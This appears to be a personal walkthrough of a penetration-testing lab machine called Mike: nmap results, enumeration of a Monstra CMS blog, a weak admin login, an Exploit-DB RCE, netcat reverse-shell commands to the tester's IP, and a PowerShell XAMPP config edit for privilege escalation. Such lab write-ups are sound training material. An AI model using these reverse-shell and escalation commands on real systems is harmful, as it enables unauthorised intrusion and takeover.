80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_http-title: Mike Wazowski
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mike Wazowski
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MIKE-PC
|   NetBIOS_Domain_Name: MIKE-PC
|   NetBIOS_Computer_Name: MIKE-PC
|   DNS_Domain_Name: Mike-PC
|   DNS_Computer_Name: Mike-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-08-07T16:56:13+00:00
| ssl-cert: Subject: commonName=Mike-PC
| Issuer: commonName=Mike-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-06T16:52:32
| Not valid after:  2027-02-05T16:52:32
| MD5:   ee11:6bfe:1a81:c2dc:1cad:8d76:ac96:5851
|_SHA-1: 388d:a68a:002a:9c1e:d775:d340:98d3:b4c6:207e:253f
|_ssl-date: 2026-08-07T16:56:27+00:00; 0s from scanner time.
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC


port 80
<img width="1750" height="646" alt="image" src="https://github.com/user-attachments/assets/8af5fb10-7a8c-4bad-b668-6595a089e533" />
/blog shows me cms. Monstra 3.0.4
<img width="795" height="850" alt="image" src="https://github.com/user-attachments/assets/44e9ba68-baeb-43fa-8492-937a7dd36009" />
users are mike and admin
<img width="1342" height="454" alt="image" src="https://github.com/user-attachments/assets/124c026b-be36-45f5-a615-49900117973b" />
robots.txt
User-agent: *
Disallow: /admin/
Disallow: /engine/
Disallow: /libraries/
Disallow: /plugins/

yolo /admin admin:wazowski worked

rce
this exploit worked. but omg the syntax and indentations had to be fixed. pmo
https://www.exploit-db.com/exploits/52038
<img width="1008" height="224" alt="image" src="https://github.com/user-attachments/assets/b2a6258b-f802-4662-baf4-31c55f538a61" />

C:\Windows\Temp\nc64.exe -e cmd.exe 192.168.45.184 443
powershell "C:\Windows\Temp\nc64.exe -e cmd.exe 192.168.45.184 443"
<img width="507" height="117" alt="image" src="https://github.com/user-attachments/assets/d1949802-2d10-46f6-a143-e25c1a365450" />

passwords file in mikes folder?
<img width="711" height="250" alt="image" src="https://github.com/user-attachments/assets/247f80b2-849e-40b4-b910-92cf6884f840" />

create a reverse.exe using msfvenom
xampp version 7.3.10.1 has a priv esc
<img width="531" height="154" alt="image" src="https://github.com/user-attachments/assets/9ff1666c-afbb-480a-9bad-ea880bad95ed" />

https://www.exploit-db.com/exploits/50337
$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
# Insert your payload path here
$replace = "C:\temp\msf.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file

BUT. the last line kept having error for me
modified using ai oops
(Get-Content $file) -replace $find, $replace | Set-Content $file

then after that it still gave me mike shell ??!?!?!
 i had to shutdown /r /t 0
 then when it restarted and started the xampp it gave me shell to administrator
 <img width="455" height="78" alt="image" src="https://github.com/user-attachments/assets/cfd6ebae-8d9d-47dd-9efd-a3f37d067285" />

 
